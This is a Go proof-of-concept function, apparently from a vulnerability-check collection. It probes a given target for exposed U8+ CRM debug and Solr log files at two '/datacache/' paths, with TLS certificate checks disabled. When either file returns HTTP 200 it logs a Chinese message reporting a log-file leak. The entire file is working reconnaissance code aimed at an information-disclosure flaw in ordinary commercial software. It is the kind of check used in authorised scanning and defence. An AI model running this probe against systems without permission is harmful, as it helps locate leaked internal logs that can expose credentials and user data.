package poc

import (
	"crypto/tls"
	"log"
	"net/http"
	"strings"
)

func U8Crm_reveal(target string) {
	url := strings.TrimRight(target, "/")
	path := []string{"/datacache/crmdebug.log", "/datacache/solr.log"}
	for i := range path {
		req, err := http.NewRequest("GET", url+path[i], nil)
		if err != nil {
			log.Println(err)
			return
		}
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client := &http.Client{Transport: tr}
		resp, err := client.Do(req)
		if err != nil {
			log.Println(err)
			return
		}
		defer resp.Body.Close()
		if resp.StatusCode == http.StatusOK {
			log.Println("存在U8+ CRM日志文件泄露" + url + path[i])
		}
	}

}
